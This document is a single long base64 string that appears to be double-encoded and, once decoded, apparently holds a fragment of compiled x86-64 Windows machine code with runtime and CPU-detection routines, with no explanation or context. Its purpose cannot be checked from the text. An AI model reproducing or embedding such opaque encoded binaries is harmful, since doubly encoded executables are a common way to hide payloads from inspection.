enVnUkNBQUFoTUFQbGNPTHcwaUxYQ1F3U0l0MEpFQklnOFFnWDhQTXpFaUx4RWlKV0NCTWlVQVlpVkFRU0lsSUNGWlhRVlpJZyt4QVRZdndpL3BJaS9HTlF2K0QrQUYzTHVqWkFBQUFpOWlKUkNRd2hjQVBoTE1BQUFCTmk4YUwxMGlMenVpMi9mLy9pOWlKUkNRd2hjQVBoSmdBQUFDRC93RjFDRWlMenVoUEpBQUFUWXZHaTlkSWk4N29kdS8vLzR2WWlVUWtNSVAvQVhVMGhjQjFKMDJMeGpQU1NJdk82RnJ2Ly85Tmk4WXowa2lMenVobC9mLy9UWXZHTTlKSWk4N29ZQUFBQUlQL0FYVUVoZHQwQklYL2RReElpODdvRHlVQUFJWC9kQVdEL3dOMUtrMkx4b3ZYU0l2TzZDMzkvLytMMklsRUpEQ0Z3SFFUVFl2R2k5ZElpODdvSGdBQUFJdllpVVFrTU9zR005dUpYQ1F3aThOSWkxd2tlRWlEeEVCQlhsOWV3MGlKWENRSVNJbHNKQkJJaVhRa0dGZElnK3dnU0lzZFpSMEJBRW1MK0l2eVNJdnBTSVhiZFFXTlF3SHJFa2lMeStnckNnQUFUSXZIaTlaSWk4My8wMGlMWENRd1NJdHNKRGhJaTNRa1FFaUR4Q0JmdzBpSlhDUUlTSWwwSkJCWFNJUHNJRW1MK0l2YVNJdnhnL29CZFFYb0R3Y0FBRXlMeDR2VFNJdk9TSXRjSkRCSWkzUWtPRWlEeENCZjZXZisvLy9Nek14QVUwaUQ3Q0JJaTlrenlmOFZNeG9CQUVpTHkvOFZJaG9CQVA4VkxCb0JBRWlMeUxvSkJBREFTSVBFSUZ0SS95VWdHZ0VBU0lsTUpBaElnK3c0dVJjQUFBRG84LzhBQUlYQWRBZTVBZ0FBQU0wcFNJME5veFFDQU9pcUFBQUFTSXRFSkRoSWlRV0tGUUlBU0kxRUpEaElnOEFJU0lrRkdoVUNBRWlMQlhNVkFnQklpUVhrRXdJQVNJdEVKRUJJaVFYb0ZBSUF4d1crRXdJQUNRUUF3TWNGdUJNQ0FBRUFBQURIQmNJVEFnQUJBQUFBdUFnQUFBQklhOEFBU0kwTnVoTUNBRWpIQkFFQ0FBQUF1QWdBQUFCSWE4QUFTSXNOMGdnQ0FFaUpUQVFndUFnQUFBQklhOEFCU0lzTnhRZ0NBRWlKVEFRZ1NJME4rUnNCQU9nQS8vLy9TSVBFT01QTXpNeEFVMVpYU0lQc1FFaUwyZjhWQ3hrQkFFaUxzL2dBQUFBei8wVXp3RWlOVkNSZ1NJdk8veFg1R0FFQVNJWEFkRGxJZzJRa09BQklqVXdrYUVpTFZDUmdUSXZJU0lsTUpEQk1pOFpJalV3a2NFaUpUQ1FvTThsSWlWd2tJUDhWeWhnQkFQL0hnLzhDZkxGSWc4UkFYMTVidzh6TXpPbTNWd0FBek16TVFGTklnK3dnU0l2WlNJdkNTSTBOZFJzQkFFaUpDMGlOVXdnenlVaUpDa2lKU2doSWpVZ0k2THdsQUFCSWpRV0ZHd0VBU0lrRFNJdkRTSVBFSUZ2RHpEUEFTSWxCRUVpTkJYc2JBUUJJaVVFSVNJMEZZQnNCQUVpSkFVaUx3Y1BNUUZOSWcrd2dTSXZaU0l2Q1NJME5GUnNCQUVpSkMwaU5Vd2d6eVVpSkNraUpTZ2hJalVnSTZGd2xBQUJJalFWTkd3RUFTSWtEU0l2RFNJUEVJRnZEekRQQVNJbEJFRWlOQlVNYkFRQklpVUVJU0kwRktCc0JBRWlKQVVpTHdjUE1RRk5JZyt3Z1NJdlpTSXZDU0kwTnRSb0JBRWlKQzBpTlV3Z3p5VWlKQ2tpSlNnaElqVWdJNlB3a0FBQklpOE5JZzhRZ1c4UE16TXhJalFXSkdnRUFTSWtCU0lQQkNPbHRKUUFBekVpSlhDUUlWMGlEN0NCSWpRVnJHZ0VBU0l2NVNJa0JpOXBJZzhFSTZFb2xBQUQyd3dGMERib1lBQUFBU0l2UDZKajUvLzlJaThkSWkxd2tNRWlEeENCZnc4ek1TSVBzU0VpTlRDUWc2T0wrLy85SWpSV3o5d0VBU0kxTUpDRG9NU1VBQU14SWcreElTSTFNSkNEb0l2Ly8vMGlORlJ2NEFRQklqVXdrSU9nUkpRQUF6RWlEZVFnQVNJMEYvQmtCQUVnUFJVRUl3OHpNU0lQc0tPaVRDQUFBaGNCMElXVklpd1FsTUFBQUFFaUxTQWpyQlVnN3lIUVVNOER3U0EreERZQVdBZ0IxN2pMQVNJUEVLTU93QWV2M3pNek1TSVBzS09oWENBQUFoY0IwQitpS0JnQUE2d1hvMzFzQUFMQUJTSVBFS01OSWcrd29NOG5vUVFFQUFJVEFENVhBU0lQRUtNUE16TXhJZyt3bzZJOGxBQUNFd0hVRU1zRHJFdWlHWVFBQWhNQjFCK2lOSlFBQTYreXdBVWlEeENqRFNJUHNLT2gvWVFBQTZIWWxBQUN3QVVpRHhDakR6TXpNU0lsY0pBaElpV3drRUVpSmRDUVlWMGlEN0NCSmkvbEppL0NMMmtpTDZlakVCd0FBaGNCMUY0UDdBWFVTU0l2UDZMc0ZBQUJNaThZejBraUx6Zi9YU0l0VUpGaUxUQ1JRU0l0Y0pEQklpMndrT0VpTGRDUkFTSVBFSUYvcEExVUFBTXpNekVpRDdDam9ld2NBQUlYQWRCQklqUTJJRlFJQVNJUEVLT25QWGdBQTZOWllBQUNGd0hVRjZMRllBQUJJZzhRb3cwaUQ3Q2d6eWVqMVlBQUFTSVBFS09rRUpRQUFRRk5JZyt3Z0Q3WUZleFVDQUlYSnV3RUFBQUFQUk1PSUJXc1ZBZ0RvV2dVQUFPaFJKQUFBaE1CMUJETEE2eFRvYkdBQUFJVEFkUWt6eWVpWkpBQUE2K3FLdzBpRHhDQmJ3OHpNekVpSlhDUUlWVWlMN0VpRDdFQ0wyWVA1QVErSHBnQUFBT2pYQmdBQWhjQjBLNFhiZFNkSWpRM2dGQUlBNkdkZUFBQ0Z3SFFFTXNEcmVraU5EZVFVQWdEb1UxNEFBSVhBRDVUQTYyZElpeFdKQkFJQVNZUEkvNHZDdVVBQUFBQ0Q0RDhyeUxBQlNkUElURFBDVElsRjRFeUpSZWdQRUVYZ1RJbEY4UElQRUUzd0R4RUZoUlFDQUV5SlJlQk1pVVhvRHhCRjRFeUpSZkR5RHhFTmZSUUNBUElQRUUzd0R4RUZlUlFDQVBJUEVRMkJGQUlBU0l0Y0pGQklnOFJBWGNPNUJRQUFBT2hVQWdBQXpNek16RWlEN0JoTWk4RzRUVm9BQUdZNUJmM1QvLzkxZkVoakJURFUvLzlJalJYdDAvLy9TSTBNRUlFNVVFVUFBSFZpdUFzQ0FBQm1PVUVZZFZkTUs4SVB0MEVVU0kxUkdFZ0QwQSszUVFaSWpReUFUSTBNeWtpSkZDUkpPOUYwR0l0S0RFdzd3WElLaTBJSUE4Rk1POEJ5Q0VpRHdpanIzelBTU0lYU2RRUXl3T3NYOTBJa0FBQUFnSFFFTXNEckNyQUI2d1l5d09zQ01zQklnOFFZdzBCVFNJUHNJSXJaNkg4RkFBQXowb1hBZEF1RTIzVUhTSWNWZmhNQ0FFaUR4Q0JidzBCVFNJUHNJSUE5b3hNQ0FBQ0syWFFFaE5KMURvckw2T1JlQUFDS3kramRJZ0FBc0FGSWc4UWdXOFBNUUZOSWcrd2dTSXNWRndNQ0FFaUwyWXZLU0RNVk94TUNBSVBoUDBqVHlraUQrdjkxQ2tpTHkraG5YQUFBNnc5SWk5TklqUTBiRXdJQTZPSmNBQUF6eVlYQVNBOUV5MGlMd1VpRHhDQmJ3OHhJZyt3bzZLZi8vLzlJOTlnYndQZlkvOGhJZzhRb3c4eElpVndrSUZWSWkreElnK3dnU0lObEdBQkl1ektpM3kyWkt3QUFTSXNGbVFJQ0FFZzd3M1Z2U0kxTkdQOFZXaE1CQUVpTFJSaElpVVVRL3hWRUV3RUFpOEJJTVVVUS94VXdFd0VBaThCSWpVMGdTREZGRVA4VkdCTUJBSXRGSUVpTlRSQkl3ZUFnU0RORklFZ3pSUkJJTThGSXVmLy8vLy8vL3dBQVNDUEJTTGt6b3Q4dG1Tc0FBRWc3dzBnUFJNRklpUVVsQWdJQVNJdGNKRWhJOTlCSWlRVWVBZ0lBU0lQRUlGM0RTSTBOZVJJQ0FFai9KZG9TQVFETXpFaU5EV2tTQWdEcENDSUFBRWlOQlcwU0FnRERTSVBzS09nYjlQLy9TSU1JQk9qbS8vLy9TSU1JQWtpRHhDakR6RWlOQlNrZEFnRERneVZKRWdJQUFNTklpVndrQ0ZWSWphd2tRUHYvLzBpQjdNQUZBQUNMMmJrWEFBQUE2QzM0QUFDRndIUUVpOHZOS1lNbEdCSUNBQUJJalUzd005SkJ1TkFFQUFEb3p5RUFBRWlOVGZEL0ZlMFJBUUJJaTUzb0FBQUFTSTJWMkFRQUFFaUx5MFV6d1A4VjJ4RUJBRWlGd0hROFNJTmtKRGdBU0kyTjRBUUFBRWlMbGRnRUFBQk1pOGhJaVV3a01FeUx3MGlOamVnRUFBQklpVXdrS0VpTlRmQklpVXdrSURQSi94V2lFUUVBU0l1RnlBUUFBRWlOVENSUVNJbUY2QUFBQURQU1NJMkZ5QVFBQUVHNG1BQUFBRWlEd0FoSWlZV0lBQUFBNkRnaEFBQklpNFhJQkFBQVNJbEVKR0RIUkNSUUZRQUFRTWRFSkZRQkFBQUEveFdtRVFFQWcvZ0JTSTFFSkZCSWlVUWtRRWlOUmZBUGxNTklpVVFrU0RQSi94VTlFUUVBU0kxTUpFRC9GU29SQVFDRndIVUs5dHNid0NFRkZCRUNBRWlMbkNUUUJRQUFTSUhFd0FVQUFGM0R6TXpNU0lsY0pBaElpWFFrRUZkSWcrd2dTSTBkNnVBQkFFaU5OZVBnQVFEckZraUxPMGlGLzNRS1NJdlA2R2tBQUFELzEwaUR3d2hJTzk1eTVVaUxYQ1F3U0l0MEpEaElnOFFnWDhQTXpFaUpYQ1FJU0lsMEpCQlhTSVBzSUVpTkhhN2dBUUJJalRXbjRBRUE2eFpJaXp0SWhmOTBDa2lMeitnZEFBQUEvOWRJZzhNSVNEdmVjdVZJaTF3a01FaUxkQ1E0U0lQRUlGL0R6TXhJL3lXSkVnRUF6RUJUU0lQc0lFaU5CYk1UQVFCSWk5bElpUUgyd2dGMENyb1lBQUFBNkdieS8vOUlpOE5JZzhRZ1c4UE1TSWxjSkJCVlNJdnNTSVBzSUlObDZBQXp5VFBBeHdXcC93RUFBZ0FBQUEraVJJdkJ4d1dXL3dFQUFRQUFBRUdCOEc1MFpXeEVpOHBCZ2ZGcGJtVkpSSXZTUlF2SWk5T0I4a2RsYm5WRWk5aEVDOHE0QVFBQUFFRVBsTUNCOFdOQlRVU0I4MEYxZEdoQmdmSmxiblJwUVF2YUM5bEJENVRDTThrUG9rU0x5WWxGOEVXRXdFU0pUZmhFaXdXb0R3SUFpOGlKWGZTSlZmeDBVa2lERFNyL0FRRC9RWVBJQkNYd1AvOFBSSWtGaGc4Q0FEM0FCZ0VBZENnOVlBWUNBSFFoUFhBR0FnQjBHZ1d3K2Z6L2cvZ2dkeHRJdXdFQUFRQUJBQUFBU0EranczTUxRWVBJQVVTSkJVd1BBZ0JGaE5KMEdZSGhBQS93RDRINUFBOWdBSHdMUVlQSUJFU0pCUzRQQWdDNEJ3QUFBSWxWNEVTSlRlUkVPOWg4SkRQSkQ2S0pSZkNKWGZTSlRmaUpWZnlKWGVnUHV1TUpjd3RCZzhnQ1JJa0YrUTRDQUVFUHV1RVVjMjdIQlhUK0FRQUNBQUFBeHdWdS9nRUFCZ0FBQUVFUHV1RWJjMU5CRDdyaEhITk1NOGtQQWRCSXdlSWdTQXZRU0lsVkVFaUxSUkFrQmp3R2RUS0xCVUQrQVFDRHlBakhCUy8rQVFBREFBQUE5a1hvSUlrRktmNEJBSFFUZzhnZ3h3VVcvZ0VBQlFBQUFJa0ZGUDRCQURQQVNJdGNKRGhJZzhRZ1hjUE16TXd6d0RrRk9Ca0NBQStWd01QQ0FBRE16TXpNek16TXpNd3owa2ovSmZmOUFRRE16TXpNek16TVNJbE1KQWhWVjBGV1NJUHNVRWlOYkNRd1NJbGRTRWlKZFZCSWl3V2YvUUVBU0RQRlNJbEZHRWlMOFVpRnlYVUhNOERwVkFFQUFFaUR5LzhQSDBRQUFFai93NEE4R1FCMTkwai93MGlKWFJCSWdmdi8vLzkvZGd1NVZ3QUhnT2lOLy8vL3pEUEFpVVFrS0VpSlJDUWdSSXZMVEl2Qk05SXp5ZjhWUVE0QkFFeGo4RVNKZFFDRndIVWEveFVvRGdFQWhjQitDQSszd0EwQUFBZUFpOGpvVGYvLy81QkJnZjRBRUFBQWZTOUppOFpJQThCSWpVZ1BTRHZJZHdwSXVmRC8vLy8vLy84UFNJUGg4RWlMd2VnKzlBQUFTQ3ZoU0kxOEpERHJEa21MemtnRHllaVpTd0FBU0l2NFNJbDlDT3NTTS85SWlYMElTSXQxUUVpTFhSQkVpM1VBU0lYL2RRdTVEZ0FIZ09qZi92Ly96RVNKZENRb1NJbDhKQ0JFaTh0TWk4WXowalBKL3hXVURRRUFoY0IxSzBHQi9nQVFBQUI4Q0VpTHorZ0xUQUFBL3hWeERRRUFoY0IrQ0ErM3dBMEFBQWVBaThqb2x2Ny8vOHhJaTgvL0ZlUU9BUUJJaTloQmdmNEFFQUFBZkFoSWk4L28xRXNBQUVpRjIzVUx1UTRBQjREb2FmNy8vOHhJaThOSWkwMFlTRFBONkhudS8vOUlpMTFJU0l0MVVFaU5aU0JCWGw5ZHc4ek16TXpNek16TVFGTklnK3dnU0kwRjh3OEJBRWlMMlVpSkFZdENDSWxCQ0VpTFFoQklpVUVRU01kQkdBQUFBQUJJaThoSWhjQjBCa2lMQVA5UUNFaUx3MGlEeENCYncwQlRTSVBzSUVpTkJiTVBBUUJJaTlsSWlRRklpMGtRU0lYSmRBWklpd0gvVUJCSWkwc1lTSVhKZEF4SWc4UWdXMGovSmFrTUFRQklnOFFnVzhQTXpNeElpVndrQ0ZkSWcrd2dTSTBGYnc4QkFFaUwyVWlKQVl2NlNJdEpFRWlGeVhRR1NJc0IvMUFRU0l0TEdFaUZ5WFFHL3hWcERBRUFRUGJIQVhRTnVpQUFBQUJJaTh2bzl1My8vMGlMdzBpTFhDUXdTSVBFSUYvRHpNek16TXpNek14SWcreElTSTBGRlE4QkFJbE1KQ2hJaVZRa01FaU5UQ1FnU0kwVjhPd0JBRWlKUkNRZ1NNZEVKRGdBQUFBQTZIVVpBQURNU0lYSmRIOUlpVndrQ0loVUpCQlhTSVBzSUlFNVkzTnQ0SFZmZzNrWUJIVlppMEVnTFNBRmt4bUQrQUozVEVpTFFUQkloY0IwUTBoalVBU0YwblFXU0FOUk9FaUxTU2pveEFrQUFKRHJLK2g4VmdBQWtQWUFFSFFnU0l0QktFaUxPRWlGLzNRVVNJc0hTSXRZRUVpTHkraW4rdi8vU0l2UC85TklpMXdrTUVpRHhDQmZ3OHpNekVCVFNJUHNJRWlMMlVpTHdraU5EY0VOQVFCSWlRdElqVk1JTThsSWlRcElpVW9JU0kxSUNPZ0lHQUFBU0kwRlNRNEJBRWlKQTBpTHcwaUR4Q0Jidzh3endFaUpRUkJJalFVL0RnRUFTSWxCQ0VpTkJTUU9BUUJJaVFGSWk4SER6RWlMeEVpSldBaElpV2dZVmxkQlZFRldRVmRJZyt4UVRJdThKS0FBQUFCSmkrbE1pL0pNalVnUVRZdmdTSXZaVFl2SFNJdlZTWXZPNk1jYkFBQk1pNHdrc0FBQUFFaUwrRWlMdENTb0FBQUFUWVhKZEE1TWk4WklpOUJJaTh2b0NRa0FBT2lzSHdBQVNHTk9ERXlMejBnRHdVMkx4SXFNSk5nQUFBQ0lUQ1JBU0l1TUpMZ0FBQUJJaVd3a09FeUpmQ1F3aXhGSmk4NkpWQ1FvU0l2VFNJbEVKQ0RvOUI4QUFFeU5YQ1JRU1l0Yk1FbUxhMEJKaStOQlgwRmVRVnhmWHNQTXpNeElpVndrQ0ZkSWcrd2dUSXNKU1l2WVFZTWdBRUc0WTNOdDRFVTVBWFZhUVlONUdBUy9BUUFBQUVHNklBV1RHWFViUVl0QklFRXJ3b1A0QW5jUFNJdENLRWs1UVNpTEN3OUV6NGtMUlRrQmRTaEJnM2tZQkhVaFFZdEpJRUVyeW9QNUFuY1ZTWU41TUFCMUR1aklKUUFBaVhoQWk4ZUpPK3NDTThCSWkxd2tNRWlEeENCZnc4ek1TSXZFU0lsWUNFaUpjQkJJaVhnZ1RJbEFHRlZCVkVGVlFWWkJWMGlOYU1GSWdleXdBQUFBU0l0ZFoweUw2a2lMK1VVejVFaUx5MFNJWmNkSmk5RkVpR1hJVFl2NVRZdnc2Q2NuQUFCTWpVM3ZUSXZEU1l2WFNZdk5pL0RvVnhvQUFFeUx3MG1MMTBtTHplaVJKZ0FBVEl2RFNZdlhPL0IrSDBTTHpraU5UZS9vcHlZQUFFU0x6a3lMdzBtTDEwbUx6ZWlpSmdBQTZ3cEppODNvWUNZQUFJdndnLzcvRDR6OUF3QUFPM01FRDQzMEF3QUFnVDlqYzIzZ0Q0VkpBd0FBZzM4WUJBK0ZEd0VBQUl0SElDMGdCWk1aZy9nQ0Q0ZitBQUFBVERsbk1BK0Y5QUFBQU9qR0pBQUFURGxnSUErRVVRTUFBT2kzSkFBQVNJdDRJT2l1SkFBQVNJdFBPTVpGeHdGTWkzQW9USWwxVitnaEhnQUFnVDlqYzIzZ2RSMkRmeGdFZFJlTFJ5QXRJQVdUR1lQNEFuY0tURGxuTUErRUtnTUFBT2h2SkFBQVREbGdPQStFamdBQUFPaGdKQUFBVEl0d09PaFhKQUFBU1l2V1NJdlBUSWxnT09pZ0JRQUFoTUIxYVVXTC9FVTVKZytPOUFJQUFFbUw5T2hJSFFBQVNXTk9CRWdEeGtRNVpBRUVkQnZvTlIwQUFFbGpUZ1JJQThaSVkxd0JCT2drSFFBQVNBUEQ2d05KaThSSWpVZ0lTSTBWa1FFQ0FPajRGZ0FBaGNBUGhLNENBQUJCLzhkSWc4WVVSVHMrZkt2cGx3SUFBRXlMZFZlQlAyTnpiZUFQaFNRQ0FBQ0RmeGdFRDRVYUFnQUFpMGNnTFNBRmt4bUQrQUlQaHdrQ0FBQkVPV01NRDRaT0FRQUFSSXRGZDBpTlJkZE1pWHdrTUVTTHpraUpSQ1FvU0l2VFNJMUZ5MG1MelVpSlJDUWc2RkVaQUFDTFRjdUxWZGM3eWcrREZ3RUFBRXlOY0JCQk9YYndENC9yQUFBQVFUdDI5QStQNFFBQUFPaHFIQUFBVFdNbVRBUGdRWXRHL0lsRjA0WEFENDdCQUFBQTZHUWNBQUJJaTA4d1NJUEFCRWhqVVF4SUE4SklpVVhmNkV3Y0FBQklpMDh3U0dOUkRJc01FSWxOejRYSmZqZm9OUndBQUVpTFRkOU1pMGN3U0dNSlNBUEJTWXZNU0l2UVNJbEY1K2dzRGdBQWhjQjFISXRGejBpRFJkOEUvOGlKUmMrRndIL0ppMFhULzhoSmc4UVU2NFNLUlc5Tmk4OU1pMFZYU1l2VmlFUWtXRWlMejRwRng0aEVKRkJJaTBWL1NJbEVKRWlMUlhlSlJDUkFTWTFHOEVpSlJDUTRTSXRGNTBpSlJDUXdUSWxrSkNoSWlWd2tJTVpGeUFIb2dQdi8vNHRWMTR0TnkvL0JTWVBHRklsTnl6dktENEw2L3YvL1JUUGtSRGhseUErRm9RQUFBSXNESmYvLy94ODlJUVdUR1ErQ2p3QUFBSXR6SUlYMmRBMUlZL2JvVHhzQUFFZ0R4dXNEU1l2RVNJWEFkUWIyUXlRRWRHMzJReVFFRDRVQUFRQUFoZlowRWVncEd3QUFTSXZRU0dORElFZ0QwT3NEU1l2VVNJdlA2RklEQUFDRXdIVS9USTFONTB5THcwbUwxMG1MemVqc0ZnQUFpazF2VEl2SVRJdEZWMGlMMTRoTUpFQkppODFNaVh3a09FaUpYQ1F3ZzB3a0tQOU1pV1FrSU9oWEd3QUE2TEloQUFCTU9XQTRkRUhwa3dBQUFFUTVZd3gyNmtRNFpXOFBoWWtBQUFCSWkwVi9UWXZQU0lsRUpEaE5pOGFMUlhkSmk5V0pSQ1F3U0l2UGlYUWtLRWlKWENRZzZHMEFBQURydEV5Tm5DU3dBQUFBU1l0Yk1FbUxjemhKaTN0SVNZdmpRVjlCWGtGZFFWeGR3K2d4VUFBQXpPZ3JVQUFBekxJQlNJdlA2RkQ1Ly85SWpVMzM2QS82Ly85SWpSVjA1Z0VBU0kxTjkraXJFZ0FBek9nQlVBQUF6T2o3VHdBQXpPajFUd0FBek9qdlR3QUF6TXpNU0lsY0pCQk1pVVFrR0ZWV1YwRlVRVlZCVmtGWFNJUHNjSUU1QXdBQWdFMkwrVW1MK0V5TDRraUw4UStFQ0FJQUFPaktJQUFBUkl1c0pPQUFBQUJJaTZ3azBBQUFBRWlEZUJBQWRGWXp5ZjhWNHdRQkFFaUwyT2lqSUFBQVNEbFlFSFJBZ1Q1TlQwUGdkRGlCUGxKRFErQjBNRWlMaENUb0FBQUFUWXZQU0lsRUpEQk1pOGRFaVd3a0tFbUwxRWlMemtpSmJDUWc2SkVZQUFDRndBK0ZsZ0VBQUlOOURBQVBoS1FCQUFCRWk3UWsyQUFBQUVpTlJDUmdUSWw4SkRCRmk4NUlpVVFrS0VXTHhVaU5oQ1N3QUFBQVNJdlZTWXZNU0lsRUpDRG84aFVBQUl1TUpMQUFBQUE3VENSZ0Q0TkdBUUFBU0kxNERFUTdkL1FQakNFQkFBQkVPM2Y0RDQ4WEFRQUE2QWdaQUFCSVl3OUlqUlNKU0dOUEJFaU5GSkdEZkJEd0FIUWo2TzBZQUFCSVl3OUlqUlNKU0dOUEJFaU5GSkZJWTF3UThPalVHQUFBU0FQRDZ3SXp3RWlGd0hSSzZNTVlBQUJJWXc5SWpSU0pTR05QQkVpTkZKR0RmQkR3QUhRajZLZ1lBQUJJWXc5SWpSU0pTR05QQkVpTkZKRklZMXdROE9pUEdBQUFTQVBENndJendJQjRFQUFQaFlFQUFBRG9lUmdBQUVoakQwaU5GSWxJWTA4RVNJMFVrZlpFRU94QWRXYm9YaGdBQUlzUFRZdlBUSXVFSk1BQUFBRC95Y1pFSkZnQXhrUWtVQUZJWThsSWpSU0pTSTBNa0VoalJ3UklBOGhKaTlSSWk0UWs2QUFBQUVpSlJDUklTSTFIOUVTSmJDUkFTSWxFSkRoSWcyUWtNQUJJaVV3a0tFaUx6a2lKYkNRZzZPbjMvLytMakNTd0FBQUEvOEZJZzhjVWlZd2tzQUFBQUR0TUpHQVBncjcrLy85SWk1d2t1QUFBQUVpRHhIQkJYMEZlUVYxQlhGOWVYY1BvbGswQUFNek1TSWxjSkFoSWlXd2tFRWlKZENRWVYwRlVRVlZCVmtGWFNJUHNJRWlMOGt5TDZVaUYwZytFb1FBQUFFVXk5alAvT1RwK2VPaWJGd0FBU0l2UVNZdEZNRXhqZUF4Smc4Y0VUQVA2NklRWEFBQklpOUJKaTBVd1NHTklESXNzQ29YdGZrUklZOGRNalNTQTZHWVhBQUJJaTloSll3ZElBOWpvUkJjQUFFaGpUZ1JJaTlOTmkwVXdTbzBFb0VnRHlPaFZDUUFBaGNCMURQL05TWVBIQklYdGY4anJBMEcyQWYvSE96NThpRWlMWENSUVFZckdTSXRzSkZoSWkzUWtZRWlEeENCQlgwRmVRVjFCWEYvRDZNTk1BQURNek14SS8rTE1TSXZDU1l2UVNQL2d6TXpNU1l2QVRJdlNTSXZRUll2QlNmL2l6RWhqQWtnRHdZTjZCQUI4Rmt4alNnUklZMUlJU1lzTUNVeGpCQXBOQThGSkE4RER6RWlKWENRSVNJbDBKQkJJaVh3a0dFRldTSVBzSUVtTCtVeUw4VUgzQUFBQUFJQjBCVWlMOHVzSFNXTndDRWdETXVpVEFBQUFnK2dCZEQ2RCtBRjFhalBiT1Y4WWRBL29jUllBQUVpTDJFaGpSeGhJQTloSWpWY0lTWXRPS09oNi8vLy9USXZBUWJrQkFBQUFTSXZUU0l2TzZGYi8vLy9yTVRQYk9WOFlkQS9vT0JZQUFFaUwyRWhqUnhoSUE5aElqVmNJU1l0T0tPaEIvLy8vVEl2QVNJdlRTSXZPNkJmLy8vL3JCdWpNU3dBQWtFaUxYQ1F3U0l0MEpEaElpM3drUUVpRHhDQkJYc1BNU0lsY0pBaElpWFFrRUVpSmZDUVlRVlZCVmtGWFNJUHNNRTJMOFVtTDJFaUw4a3lMNlRQL1JZdDRCRVdGLzNRT1RXUC82S2dWQUFCSmpSUUg2d05JaTlkSWhkSVBoSDRCQUFCRmhmOTBFZWlNRlFBQVNJdklTR05EQkVnRHlPc0RTSXZQUURoNUVBK0VXd0VBQURsN0NIVU05d01BQUFDQUQ0UktBUUFBaXd1RnlYZ0tTR05EQ0VnREJraUw4SVRKZVROQjlnWVFkQzFJaXgzUi93RUFTSVhiZENGSWk4dm9WTy8vLy8vVFNJWEFkQTFJaGZaMENFaUpCa2lMeU90WjZPOUtBQUQyd1FoMEdFbUxUU2hJaGNsMENraUY5blFGU0lrTzZ6em8wa29BQUVIMkJnRjBSMG1MVlNoSWhkSjBPVWlGOW5RMFRXTkdGRWlMenVnZUZ3QUFRWU4rRkFnUGhhc0FBQUJJT1Q0UGhLSUFBQUJJaXc1SmpWWUk2UEw5Ly85SWlRYnBqZ0FBQU9pRlNnQUFRWXRlR0lYYmRBNUlZOXZvdFJRQUFFaU5EQVByQTBpTHowaUZ5WFV3U1l0TktFaUZ5WFFpU0lYMmRCMUpZMTRVU1kxV0NPaXMvZi8vU0l2UVRJdkRTSXZPNktvV0FBRHJRT2czU2dBQVNUbDlLSFE1U0lYMmREU0YyM1FSNkdNVUFBQklpOGhKWTBZWVNBUEk2d05JaTg5SWhjbDBGMEdLQmlRRTl0Z2J5ZmZaLzhHTCtZbE1KQ0NMeCtzTzZQTkpBQUNRNk8xSkFBQ1FNOEJJaTF3a1VFaUxkQ1JZU0l0OEpHQklnOFF3UVY5QlhrRmR3MEJUVmxkQlZFRlZRVlpCVjBpRDdIQklpL2xGTS85RWlYd2tJRVFodkNTd0FBQUFUQ0Y4SkNoTUlid2t5QUFBQU9pdkdnQUFUSXRvS0V5SmJDUkE2S0VhQUFCSWkwQWdTSW1FSk1BQUFBQklpM2RRU0ltMEpMZ0FBQUJJaTBkSVNJbEVKREJJaTE5QVNJdEhNRWlKUkNSSVRJdDNLRXlKZENSUVNJdkw2Sjd2Ly8vb1hSb0FBRWlKY0NEb1ZCb0FBRWlKV0Nqb1N4b0FBRWlMVUNCSWkxSW9TSTFNSkdEb3ZSSUFBRXlMNEVpSlJDUTRURGwvV0hRY3g0UWtzQUFBQUFFQUFBRG9HeG9BQUVpTFNIQklpWXdreUFBQUFFRzRBQUVBQUVtTDFraUxUQ1JJNkVRY0FBQklpOWhJaVVRa0tFaUx2Q1RBQUFBQTYzakhSQ1FnQVFBQUFPamRHUUFBZzJCQUFFaUx0Q1M0QUFBQWc3d2tzQUFBQUFCMEliSUJTSXZPNk5ueC8vOUlpNFFreUFBQUFFeU5TQ0JFaTBBWWkxQUVpd2pyRFV5TlRpQkVpMFlZaTFZRWl3Ny9GZFA5QUFCRWkzd2tJRWlMWENRb1RJdHNKRUJJaTd3a3dBQUFBRXlMZENSUVRJdGtKRGhKaTh6b0toSUFBRVdGLzNVeWdUNWpjMjNnZFNxRGZoZ0VkU1NMUmlBdElBV1RHWVA0QW5jWFNJdE9LT2lCRWdBQWhjQjBDcklCU0l2TzZFL3gvLy9vTGhrQUFFaUplQ0RvSlJrQUFFeUphQ2hJaTBRa01FaGpTQnhKaXdaSXh3UUIvdi8vLzBpTHcwaUR4SEJCWDBGZVFWMUJYRjllVzhQTXpFaUQ3Q2hJaXdHQk9GSkRRK0IwRW9FNFRVOUQ0SFFLZ1RoamMyM2dkUlhyR3VqU0dBQUFnM2d3QUg0STZNY1lBQUQvU0RBendFaUR4Q2pENkxnWUFBQ0RZREFBNkp0SEFBRE16TXhJaThSRWlVZ2dUSWxBR0VpSlVCQklpVWdJVTFaWFFWUkJWVUZXUVZkSWcrd3dSWXZoU1l2d1RJdnFUSXY1NkpFUkFBQklpVVFrS0V5THhrbUwxVW1MeitpT0dRQUFpL2pvWHhnQUFQOUFNSVAvL3crRTlnQUFBRUU3L0ErTzdRQUFBSVAvL3crTzNnQUFBRHQrQkErTjFRQUFBRXhqOStoSUVRQUFTR05PQ0VxTkJQQ0xQQUdKZkNRZzZEUVJBQUJJWTA0SVNvMEU4SU44QVFRQWRCem9JQkVBQUVoalRnaEtqUVR3U0dOY0FRVG9EaEVBQUVnRHcrc0NNOEJJaGNCMFhrU0x6MHlMeGttTDFVbUx6K2hWR1FBQTZPd1FBQUJJWTA0SVNvMEU4SU44QVFRQWRCem8yQkFBQUVoalRnaEtqUVR3U0dOY0FRVG94aEFBQUVnRHcrc0NNOEJCdUFNQkFBQkppOWRJaThqbzNoa0FBRWlMVENRbzZQd1FBQURySGtTTHBDU0lBQUFBU0l1MEpJQUFBQUJNaTJ3a2VFeUxmQ1J3aTN3a0lJbDhKQ1RwQi8vLy8raEtSZ0FBa09oWUZ3QUFnM2d3QUg0STZFMFhBQUQvU0RDRC8vOTBDMEU3L0g0RzZDZEdBQURNUkl2UFRJdkdTWXZWU1l2UDZLVVlBQUJJZzhRd1FWOUJYa0ZkUVZ4ZlhsdkR6RWlKWENRSVNJbHNKQkJJaVhRa0dGZEJWRUZWUVZaQlYwaUQ3RUJJaS9GTmkvRkppOGhOaStoTWkvcm9KT3ovLytqakZnQUFTSXU4SkpBQUFBQXoyNzMvLy84ZnVpSUZreGxCdUNrQUFJQkJ1U1lBQUlCQnZBRUFBQUE1V0VCMU5JRStZM050NEhRc1JEa0dkUkNEZmhnUGRRcElnWDVnSUFXVEdYUVhS